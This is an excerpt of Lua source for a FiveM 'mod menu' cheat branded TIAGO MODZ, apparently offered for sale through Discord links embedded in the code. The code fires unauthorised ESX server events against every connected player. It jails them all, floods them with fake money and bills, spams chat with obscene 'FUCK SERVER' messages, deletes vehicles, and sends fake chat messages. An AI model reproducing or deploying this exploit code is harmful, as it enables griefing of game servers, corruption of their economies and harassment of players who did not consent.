...
Citizen.CreateThread(
    ...
    GetVehiclePedIsIn(GetPlayerPed(-1), false) then SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1) DeleteEntity(GetVehiclePedIsIn(vehicle, true)) SetEntityAsMissionEntity(vehicle, 1, 1) DeleteEntity(vehicle) end end end
			...
			if banallusers then
				...
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcom *TIAGO MODZ 3.1* Sell Mod Menu in https://discord.gg/K4mYqG")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Tiago Menu 3.1 https://discord.gg/DseBd8", 10000000)
				end
			end
			...
			if spam then
                for i = 0, 128 do
                    ...
                    'FUCK SERVER by TIAGO MODZ#1696',
                    {0, 0x99, 255},
                    'FUCK SERVER by TIAGO MODZ#1696'
                )
                TriggerServerEvent('_chat:messageEntered', 'FUCK SERVER by TIAGO MODZ#1696', {0, 0x99, 255}, 'FUCK SERVER by TIAGO MODZ#1696')
                end
			end
...
Citizen.CreateThread(
	function()
		...
		TiagoMenu.SetSubTitle("MainMenu", "»»»»»»»»»»»»TIAGO MODZ#1696««««««««««««")
		...
		while Enabled do
			if TiagoMenu.IsMenuOpened("MainMenu") then
			    drawNotification("~g~Working... ~n~~r~Tiago Menu ~s~V 3.2")
				drawNotification("~g~Official Discord: ~s~~n~ https://discord.gg/ARQrmX5 ~n~~r~TIAGO MODZ#1696")
				...
				elseif TiagoMenu.Button("~r~Disconnect") then
					Enabled = false
				end
	 ...
	 elseif TiagoMenu.Button("~h~~g~Fake chat Message") then 
	...
	elseif TiagoMenu.CheckBox("~h~~r~Fuck~s~ Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
			...
			if TiagoMenu.Button("~b~~h~Clown") then
			...
			elseif TiagoMenu.Button("~b~~h~Stripper") then
			local model = "s_f_y_stripper_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif TiagoMenu.Button("~b~~h~Cop") then
			local model = "s_m_y_cop_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif TiagoMenu.Button("~b~~h~Chimp") then
			local model = "a_c_chimp"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif TiagoMenu.Button("~b~~h~Alien") then
			local model = "s_m_m_movalien_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif TiagoMenu.Button("~b~~h~Pongo") then
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif TiagoMenu.Button("~b~~h~Babyd") then
			local model = "u_m_y_babyd"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif TiagoMenu.Button("~b~~h~Fivem") then
			...
			elseif TiagoMenu.IsMenuOpened("PlayerOptionsMenu") then
				...
				elseif TiagoMenu.Button("spam msg") then
					TriggerServerEvent('_chat:messageEntered', GetPlayerServerId(SelectedPlayer), {0, 0x99, 255}, '/tw FUCK SERVER by TIAGO MODZ#1696')
